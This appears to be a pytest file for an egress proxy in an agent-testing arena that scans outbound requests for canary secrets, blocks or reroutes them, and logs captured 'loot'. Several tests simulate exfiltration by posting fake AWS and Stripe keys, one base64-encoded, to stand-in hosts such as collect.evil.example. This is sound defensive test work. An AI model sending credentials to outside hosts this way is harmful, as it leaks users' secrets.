"""Tests for arena.egress — minimal forward HTTP proxy with canary scanning."""
from __future__ import annotations

import socket
import threading
import time
import urllib.request
import urllib.error
import base64

import os

import pytest

from arena import tripwire
from arena.attacker_server import CaptureServer
from arena.egress import EgressProxy


@pytest.fixture
def canaries():
    return tripwire.mint("egr-sess")


@pytest.fixture
def capture():
    s = CaptureServer(host="127.0.0.1", port=0)
    s.start()
    yield s
    s.stop()


@pytest.fixture
def proxy_guard_on(capture, canaries):
    trips = []
    p = EgressProxy(capture.url, canaries, guard=True, on_trip=lambda t: trips.append(t))
    p.start()
    yield p, trips
    p.stop()


@pytest.fixture
def proxy_guard_off(capture, canaries):
    p = EgressProxy(capture.url, canaries, guard=False, on_trip=lambda t: None,
                    session="off-sess")
    p.start()
    yield p
    p.stop()


def _proxy_request(proxy_url, target_url, body=None, method="GET"):
    """Send a request through the proxy using urllib."""
    proxy_handler = urllib.request.ProxyHandler({"http": proxy_url})
    opener = urllib.request.build_opener(proxy_handler)
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(target_url, data=data, method=method)
    return opener.open(req, timeout=10)


# ---------------------------------------------------------------- lifecycle

def test_proxy_starts_and_has_url(proxy_guard_on):
    proxy, _ = proxy_guard_on
    assert proxy.url.startswith("http://127.0.0.1:")


# ---------------------------------------------------------------- canary detection

def test_canary_in_body_blocked(proxy_guard_on, capture, canaries):
    proxy, trips = proxy_guard_on
    body = f"secret={canaries['aws_access_key']}"
    try:
        _proxy_request(proxy.url, capture.url + "/collect", body=body, method="POST")
        pytest.fail("Expected 403")
    except urllib.error.HTTPError as e:
        assert e.code == 403
    assert len(trips) >= 1
    assert len(capture.loot()) == 0  # never reached the capture server


def test_base64_canary_blocked(proxy_guard_on, capture, canaries):
    proxy, trips = proxy_guard_on
    encoded = base64.b64encode(canaries["stripe_key"].encode()).decode()
    body = f"data={encoded}"
    try:
        _proxy_request(proxy.url, capture.url + "/collect", body=body, method="POST")
        pytest.fail("Expected 403")
    except urllib.error.HTTPError as e:
        assert e.code == 403
    assert len(trips) >= 1


# ---------------------------------------------------------------- guard OFF

def test_guard_off_reaches_capture(proxy_guard_off, capture):
    body = "harmless data"
    resp = _proxy_request(proxy_guard_off.url, capture.url + "/collect",
                          body=body, method="POST")
    assert resp.status == 200
    loot = capture.loot(session="off-sess")
    assert len(loot) == 1
    assert "harmless" in loot[0]["preview"]


# ---------------------------------------------------------------- allow-list

def test_non_allowlist_blocked(proxy_guard_on, capture):
    proxy, _ = proxy_guard_on
    try:
        _proxy_request(proxy.url, "http://evil.example.com/steal", method="GET")
        pytest.fail("Expected 403")
    except urllib.error.HTTPError as e:
        assert e.code == 403


# ---------------------------------------------------------------- CONNECT refused

def test_connect_refused(proxy_guard_on):
    proxy, _ = proxy_guard_on
    # Send a raw CONNECT request
    host, port = proxy.url.replace("http://", "").split(":")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect(("127.0.0.1", int(port)))
        s.sendall(b"CONNECT evil.example.com:443 HTTP/1.1\r\nHost: evil.example.com:443\r\n\r\n")
        resp = s.recv(4096).decode()
        assert "403" in resp
    finally:
        s.close()


# ---------------------------------------------------------------- clean request passes

def test_clean_request_allowed(proxy_guard_on, capture):
    """M5: guard ON blocks ALL outbound traffic, even to the capture server."""
    proxy, trips = proxy_guard_on
    body = "just some normal data"
    import urllib.error
    with pytest.raises(urllib.error.HTTPError) as exc_info:
        _proxy_request(proxy.url, capture.url + "/collect", body=body, method="POST")
    assert exc_info.value.code == 403
    assert len(trips) == 0


# ---------------------------------------------------------------- guard OFF re-routing

def test_guard_off_evil_host_rerouted_to_capture(capture, canaries):
    """Guard OFF: POST to collect.evil.example/collect with canary body
    lands in capture loot for the session, with canary_hit and target."""
    capture.watch("rerout-sess", canaries)
    trips = []
    p = EgressProxy(capture.url, canaries, guard=False,
                    on_trip=lambda t: trips.append(t), session="rerout-sess")
    p.start()
    try:
        body = canaries["aws_access_key"]
        resp = _proxy_request(p.url, "http://collect.evil.example/collect",
                              body=body, method="POST")
        assert resp.status == 200
        loot = capture.loot(session="rerout-sess")
        assert len(loot) == 1
        assert loot[0].get("canary_hit") is True
        assert loot[0].get("target") == "collect.evil.example/collect"
        assert loot[0]["method"] == "POST"
    finally:
        p.stop()


def test_guard_on_evil_host_canary_blocked(proxy_guard_on, capture, canaries):
    """Guard ON: POST to evil host with canary body -> 403 + callback."""
    proxy, trips = proxy_guard_on
    body = canaries["aws_access_key"]
    try:
        _proxy_request(proxy.url, "http://collect.evil.example/collect",
                       body=body, method="POST")
        pytest.fail("Expected 403")
    except urllib.error.HTTPError as e:
        assert e.code == 403
    assert len(trips) >= 1
    assert len(capture.loot()) == 0


def test_guard_off_no_dns_resolution(capture, canaries):
    """Guard OFF: original host DNS is never resolved (use an unresolvable host)."""
    p = EgressProxy(capture.url, canaries, guard=False, on_trip=lambda t: None,
                    session="nodns-sess")
    p.start()
    try:
        # this-host-does-not-exist-999.invalid will never resolve in DNS
        resp = _proxy_request(p.url,
                              "http://this-host-does-not-exist-999.invalid/steal",
                              body="safe data", method="POST")
        # Must succeed (re-routed to capture, never tried to resolve the host)
        assert resp.status == 200
        loot = capture.loot(session="nodns-sess")
        assert len(loot) == 1
        assert loot[0].get("target") == "this-host-does-not-exist-999.invalid/steal"
    finally:
        p.stop()


def test_guard_off_preserves_method_and_body(capture, canaries):
    """Guard OFF: re-routed request preserves original method and body."""
    p = EgressProxy(capture.url, canaries, guard=False, on_trip=lambda t: None,
                    session="method-sess")
    p.start()
    try:
        body = "payload=hello"
        resp = _proxy_request(p.url, "http://licence.evil.example/register",
                              body=body, method="PUT")
        assert resp.status == 200
        loot = capture.loot(session="method-sess")
        assert len(loot) == 1
        assert loot[0]["method"] == "PUT"
        assert "hello" in loot[0]["preview"]
        assert loot[0].get("target") == "licence.evil.example/register"
    finally:
        p.stop()


# ---------------------------------------------------------------- bind address from env

def test_proxy_bind_address_from_env(capture, canaries, monkeypatch):
    """ARENA_PROXY_BIND env var overrides the bind address; .url reflects it."""
    # Use 0.0.0.0 (all interfaces) which is distinct from the default 127.0.0.1
    monkeypatch.setenv("ARENA_PROXY_BIND", "0.0.0.0")
    p = EgressProxy(capture.url, canaries, guard=False, on_trip=lambda t: None,
                    session="bind-sess")
    p.start()
    try:
        assert p.url.startswith("http://0.0.0.0:")
        # Confirm it actually works (0.0.0.0 accepts connections on 127.0.0.1)
        proxy_via_lo = p.url.replace("0.0.0.0", "127.0.0.1")
        resp = _proxy_request(proxy_via_lo, "http://any.example/path",
                              body="bind test", method="POST")
        assert resp.status == 200
        loot = capture.loot(session="bind-sess")
        assert len(loot) == 1
    finally:
        p.stop()


def test_proxy_default_bind_is_localhost(capture, canaries, monkeypatch):
    """Without ARENA_PROXY_BIND the proxy defaults to 127.0.0.1."""
    monkeypatch.delenv("ARENA_PROXY_BIND", raising=False)
    p = EgressProxy(capture.url, canaries, guard=True, on_trip=lambda t: None)
    p.start()
    try:
        assert p.url.startswith("http://127.0.0.1:")
    finally:
        p.stop()
